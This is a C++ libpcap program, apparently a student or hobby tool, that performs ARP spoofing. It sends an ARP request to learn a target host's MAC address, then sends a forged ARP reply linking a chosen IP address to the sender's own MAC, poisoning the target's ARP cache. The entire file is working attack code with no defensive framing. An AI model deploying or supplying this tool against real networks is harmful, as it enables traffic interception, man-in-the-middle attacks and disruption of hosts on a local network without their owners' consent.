#include <cstring>
#include <iostream>
#include <pcap.h>
#include <net/if.h>
#include <net/if_arp.h>
#include <netinet/in.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <unistd.h>

#include "network/ArpPacket.h"

#define MAX_BYTES 2048

using namespace network;
using namespace std;

HwAddr get_dev_mac(const char *dev) {
    ifreq ifr{};
    int fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);

    strncpy(ifr.ifr_name, dev, IF_NAMESIZE-1);

    if (ioctl(fd, SIOCGIFHWADDR, &ifr) != 0) {
        close(fd);
        return HwAddr("00:00:00:00:00:00");
    }

    byte mac[6];
    memcpy(mac, ifr.ifr_addr.sa_data, HwAddr::size);

    close(fd);
    return HwAddr(mac);
}

HwAddr get_target_mac(pcap* desc, const HwAddr& smac, const IpAddr& sip, const IpAddr& tip) {
    ArpPacket arp(ARPOP_REQUEST,
                  smac, sip,
                  HwAddr(), tip);
    arp.ether.dst = HwAddr("FF:FF:FF:FF:FF:FF");
    const byte *packet = arp.to_bytes();
    if (pcap_sendpacket(desc, packet, ArpPacket::size) != 0) {
        cerr << "Error sending the packet : " << pcap_geterr(desc) << endl;
        exit(-1);
    }

    pcap_pkthdr *header;
    int res = 0;
    while ((res = pcap_next_ex(desc, &header, &packet)) >= 0) {
        if (res == 0) continue;
        arp = ArpPacket(packet);
        if (arp.arp.opcode == ARPOP_REPLY and arp.arp.sender_ip == tip) {
            return arp.arp.sender_mac;
        }
    }
    return HwAddr("FF:FF:FF:FF:FF:FF");
}

int main(int argc, char *argv[]) {
    pcap_t *desc = nullptr;
    auto filter = new bpf_program;
    char errbuf[PCAP_ERRBUF_SIZE] = {};
    char *dev = argv[1];

    std::memset(errbuf, 0, PCAP_ERRBUF_SIZE);

    cout << "open device " << dev << endl;

    if ((desc = pcap_open_live(dev, MAX_BYTES, 0, 512, errbuf)) == nullptr) {
        cerr << "error: "  << errbuf << endl;
        return -1;
    }

    if (pcap_compile(desc, filter, "arp", 1, 0) == -1 and pcap_setfilter(desc, filter) == -1) {
        cerr << "error: "  << pcap_geterr(desc) << endl;
        return -1;
    }

    IpAddr sip = IpAddr(argv[2]);
    IpAddr tip = IpAddr(argv[3]);
    HwAddr sender_mac = get_dev_mac(dev);
    HwAddr target_mac = get_target_mac(desc, sender_mac, sip, tip);

    ArpPacket arp = ArpPacket(ARPOP_REPLY,
            sender_mac, sip,
            target_mac, tip);
    byte *packet = arp.to_bytes();

    if (pcap_sendpacket(desc, packet, ArpPacket::size) != 0) {
        cerr << "Error sending the packet : " << pcap_geterr(desc) << endl;
        return -1;
    }

    free(packet);
    pcap_close(desc);
    delete(filter);
    return 0;
}